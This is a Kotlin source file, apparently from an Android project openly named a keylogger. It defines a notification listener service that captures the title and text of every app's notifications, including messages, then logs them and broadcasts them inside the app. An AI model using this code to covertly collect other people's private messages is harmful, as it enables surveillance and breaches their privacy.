package com.azamovhudstc.androidkeylogger

import android.app.Notification
import android.content.Intent
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class MyNotificationListenerService : NotificationListenerService() {

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        super.onNotificationPosted(sbn)
        // Handle notification posted
        // Handle notification posted
        val notification = sbn.notification
        val extras = notification.extras
        val title = extras.getString("android.title")
        val text = extras.getCharSequence("android.text")?.toString()
        val packageName = sbn.packageName
        val timeStamp = SimpleDateFormat("HH:mm", Locale.getDefault()).format(Date())

        if (title != null && text != null) {
            Log.d("NotificationListener", "Package: $packageName, Title: $title, Text: $text")
            // Handle the received SMS or message here
                // MainActivity da updateRecyclerView ni chaqirish
                val intent = Intent("com.azamovhudstc.androidkeylogger.NOTIFICATION_LISTENER")
                intent.putExtra("packageName", packageName)
                intent.putExtra("title", title)
                intent.putExtra("text", text)
                intent.putExtra("date", timeStamp)
                sendBroadcast(intent)
//            saveNotificationToFile(NotificationModel(packageName, title, text))
        }
    }



    override fun onNotificationRemoved(sbn: StatusBarNotification) {
        super.onNotificationRemoved(sbn)

    }
}
